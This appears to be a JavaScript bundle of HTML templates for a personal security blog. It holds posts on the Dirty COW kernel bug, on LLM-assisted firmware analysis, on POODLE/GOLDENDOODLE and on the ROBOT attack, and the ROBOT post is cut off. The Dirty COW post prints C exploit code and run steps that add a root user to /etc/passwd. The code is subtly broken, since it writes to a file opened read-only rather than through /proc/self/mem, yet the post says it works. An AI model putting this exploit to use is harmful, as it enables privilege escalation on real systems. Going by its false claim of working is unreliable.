          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Jf=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,em=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,nm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
